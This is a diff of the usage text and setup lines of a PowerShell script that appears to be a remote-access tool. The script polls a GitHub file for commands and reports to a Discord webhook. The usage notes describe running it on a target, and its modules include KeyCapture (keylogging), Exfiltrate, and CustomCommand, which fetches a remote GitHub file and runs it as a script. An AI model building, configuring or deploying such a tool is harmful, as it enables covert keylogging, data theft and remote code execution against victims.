@@ -11,7 +11,7 @@ USAGE
 Setup the script
 Run the script on a target.
 check discord for 'waiting to connect..' message.
-save the contents of your github file to contain 'options' to get a list of commands
+save the contents of your github file to contain 'options' to get a list of commands (no quotes)
 do the same with any other command listed to run that module.
 
 MODULES
@@ -26,20 +26,20 @@ MODULES
 = CustomCommand : Execute a github file as a script.   =
 
 SETUP
-1. change YOUR_GITHUB_FILE_URL to the url for the file that contains the command eg. https://raw.githubusercontent.com/Username/Repo/main/file.txt
-2. change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+1. change "$gh" to the url for the file that contains the command eg. "https://raw.githubusercontent.com/Username/Repo/main/file.txt"
+2. change "$dc" to your webhook eg. "https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx"
 
 EXTRA
-You can add custom scripting in a secondary github file, change YOUR_OTHER_GITHUB_FILE_URL to another text file and add code to it,
-then in the first github file save it with 'customcommand' as the contents 
+You can add custom scripting in a secondary github file, change "$cc" to another text file and add code to it,
+then in the first github file save it with 'customcommand' as the contents (no quotes)
 
-Killswitch : save github file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
+Killswitch : save github file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands. (no quotes)
 
 #>
 
-$GHurl = "YOUR_GITHUB_FILE_URL"
-$CCurl = "YOUR_OTHER_GITHUB_FILE_URL"
-$hookurl = "YOUR_WEBHOOK_URL"
+$GHurl = "$gh"   # YOUR GITHUB FILE URL
+$CCurl = "$cc"   # YOUR SECONDARY GITHUB FILE URL (optional)
+$hookurl = "$dc" # YOUR WEBHOOK URL
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
 
